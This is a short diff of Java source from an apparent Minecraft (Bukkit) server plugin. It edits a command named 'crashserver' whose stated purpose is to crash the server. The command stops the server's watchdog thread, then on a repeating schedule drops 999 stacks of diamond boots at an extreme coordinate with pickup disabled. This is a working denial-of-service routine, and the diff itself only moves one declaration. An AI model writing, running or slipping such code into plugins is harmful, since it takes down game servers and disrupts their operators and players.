@@ -20,12 +20,12 @@ import java.util.ArrayList;
 @CommandInfo(command = "crashserver", description = "Crashes the server", category = CommandCategory.Server)
 @ExtensionMethod({Player.class, PlayerExt.class})
 public final class CrashServer extends CommandBase {
+    ItemStack stack = new ItemStack(Material.DIAMOND_BOOTS, 127);
     @Override
     public void Execute(Player p, ArrayList<String> args) {
         WatchdogThread.doStop();
         p.Reply(ChatColor.GREEN + "Crashing!");
         Bukkit.getScheduler().scheduleSyncRepeatingTask(this.Instance(), () -> {
-            ItemStack stack = new ItemStack(Material.DIAMOND_BOOTS, 127);
             for (int i = 0; i < 999; i++) {
                 var location = p.getLocation().subtract(0d, 179769313486231570814527423731704d, 0d);
                 p.getWorld().dropItemNaturally(location, stack).setPickupDelay(Integer.MAX_VALUE);
